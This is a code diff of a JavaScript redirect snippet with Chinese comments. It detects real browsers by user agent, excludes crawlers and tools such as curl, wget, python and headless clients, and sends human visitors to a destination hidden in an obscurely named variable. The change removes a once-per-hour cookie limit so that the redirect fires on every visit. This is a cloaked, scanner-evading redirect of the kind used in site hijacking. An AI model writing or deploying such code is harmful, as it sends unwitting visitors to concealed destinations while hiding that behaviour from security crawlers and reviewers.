@@ -81,13 +81,9 @@
     const isBrowser = /chrome|safari|firefox|edge|opera|mobile/.test(ua);
     const isBot = /bot|spider|crawler|curl|python|wget|headless/.test(ua);
 
-    // ✅ Cookie 检查（防止重复跳转）
-    const visited = document.cookie.includes('visited=true');
-
-    // ✅ 跳转函数
+    // ✅ 跳转函数（每次打开都跳转）
     const redirect = () => {
-      if (isBrowser && !isBot && !visited) {
-        document.cookie = 'visited=true; max-age=3600';
+      if (isBrowser && !isBot) {
         window.location.href = _y2;
       }
     };
